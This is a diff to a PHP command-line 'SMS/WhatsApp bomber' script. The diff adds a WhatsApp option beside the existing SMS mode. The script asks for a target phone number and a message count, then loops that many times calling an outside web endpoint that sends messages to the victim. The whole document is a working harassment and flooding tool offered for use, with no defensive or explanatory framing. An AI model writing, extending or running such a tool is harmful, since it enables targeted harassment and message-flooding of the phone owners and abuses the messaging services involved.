@@ -25,13 +25,23 @@ echo "
 ┃┃╱╱┃┃━┫╭╮┫┃┃┃┃╰╯┃╱╱┃┃╰━╯┃╱╱┃┃
 ╰╯╱╱╰━━┻╯╰┻┻╯╰┻━╮┃╱╱╰┻━━━╯╱╱╰╯
 ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
-╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯Bom SMS\n\n";
-echo "Nomor Target:  ";
+╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯Bom Whatsapp/SMS\n\nThanks To : Muhammad Ikhsan Aprilyadi\n\n";
+echo "[1] Whatsapp\n[2] SMS\nPilih: ";
+$pil = trim(fgets(STDIN));
+echo "[*] Nomor Target:  ";
 $no = trim(fgets(STDIN));
-echo "Jumlah:  ";
+echo "[*] Jumlah:  ";
 $jum = trim(fgets(STDIN));
+if($pil == 1){
 for ($a = 0; $a < $jum; $a++){
-$send = curl("https://api-peking404.000webhostapp.com/duar.php?no=$no", $ua);
+$send = curl("https://api-peking404.000webhostapp.com/wa.php?no=$no", $ua);
 print_r($send);
+   }
+}
+if($pil == 2){
+	for ($a = 0; $a < $jum; $a++){
+		$send = curl("https://api-peking404.000webhostapp.com/duar.php?no=$no", $ua);
+print_r($send);
+    }
 }
 ?>
